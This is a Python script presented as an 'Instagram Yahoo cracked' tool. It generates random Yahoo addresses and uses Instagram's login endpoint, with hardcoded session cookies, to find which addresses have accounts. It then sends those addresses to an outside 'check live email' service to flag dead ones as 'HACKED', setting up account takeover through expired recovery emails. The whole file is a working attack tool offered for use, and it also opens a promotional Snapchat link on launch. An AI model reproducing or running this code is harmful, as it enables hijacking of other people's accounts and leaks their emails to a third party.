import random
import os
import datetime
import time
import requests
import sys
os.system("xdg-open https://www.snapchat.com/add/ittz_dyaa")
def emil():
    os.system("clear")
    a='''\033[1;36m
    ##########################
    #  INSATGRAM \ Profis0r
    #  SNAPCHAT  \ ittz_dyaa
    #  TELGRAM    \ @Profis0r
    #  Program language Python
    #  (:
    # TOOL INSTAGRAM YAHOO CRACKED
    ##########################
    \033[1;37m
    '''
    print(a)
    file=open("emil.txt","w")
    
    name=input("NAWEK DANE:")
    for x in range(300):
        u="1204856763416295406003826151512837489566054837101293122393394847"
        x1=random.choice(u)
        x2=random.choice(u)
        x3=random.choice(u)
        kokrawakan=name+x1+x2+x3+"@yahoo.com"
        print(kokrawakan)
        file.write(kokrawakan+"\n")

        
        



def chekerinsta():
    os.system("clear")
    season='''\033[1;36m
    ##########################
    #        @Profis0r       #
    ##########################
    \033[1;37m
    
    Bwasta Bo Chek Krdni Instakan
    
    '''
    print(season)
    filer=open("emil.txt" ,"r").readlines()
    ##########
    headhead = {
    'accept':'*/*',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8',
    'content-length':'270',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'ig_cb=1; ig_did=BF4465A9-017D-4668-B5C3-EBD3DA65B2A6; csrftoken=b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC; rur=ASH; mid=XzHZAQALAAEagshAZoRCgkUeXmJP',
    'origin':'https://www.instagram.com',
    'referer':'https://www.instagram.com/',
    'sec-fetch-dest':'empty',
    'sec-fetch-mode':'cors',
    'sec-fetch-site':'same-origin',
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
    'x-csrftoken':'b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC',
    'x-ig-app-id':'936619743392459',
    'x-ig-www-claim':'0',
    'x-instagram-ajax':'a9aec8fa634f',
    'x-requested-with':'XMLHttpRequest'
  }
    url = "https://www.instagram.com/accounts/login/ajax/"
    dani=open("instagram.txt", "w")
    for lines in filer:
        time.sleep(1)
        uin = lines.strip()
        payload = {                         
    'username' : uin,
    'enc_password':'1122334455',
    'queryParams': '{}',
    'optIntoOneTap': 'false'
    }
        http = requests.post(url, data=payload, headers=headhead).text
        #CHEKER INSTAGRAM DONE HAHAHAHA
        if '"user": true' in http:
            #########
            print(" ")
            a=(uin)
            print(uin +" = \033[0;32mHACKED \033[0;37m")
            dani.write(uin+"\n")

        else:
            print("")
            print(uin +" = \033[1;31mNOT HACKED\033[1;37m")



def cheker():
    os.system("clear")
    ani='''\033[0;33m
    ##################$Profis0r$##################
    
                \033[1;92mCrAckerForKurd0    
                  
    
    ##################$Profis0r$##################
    
    
   
    	\033[0;37m
    	Bwasta Bo Nishan Krdni Emailakan Ka Hack Abn


    '''
    
    print(ani)
    #CHEKER EMIL DONE BRAKAM
    filer=open("instagram.txt","r").readlines()
    for x in filer:
        time.sleep(10)
        u=x.strip()
        url="https://mmo69.com/_check_live_email/api.php?email="+u
        amad=requests.get(url)
        if "DIE" in amad.text:
            #BO PESHAN DANE AWANAY HACK DABN
            print("")
            print("============")
            print(u+ " = \033[0;32mHACK  \033[0;37m")
            a=datetime.datetime.now()
            print(a)
            print("============")
            print("")
        else:
            print("")
            print("=============")
            print(u+" = \033[1;31mNOT HACK\033[1;37m")
            print(" ")
            a=datetime.datetime.now()
            print(a)
            print("=============")
            print("")
            


emil()
chekerinsta()
cheker()


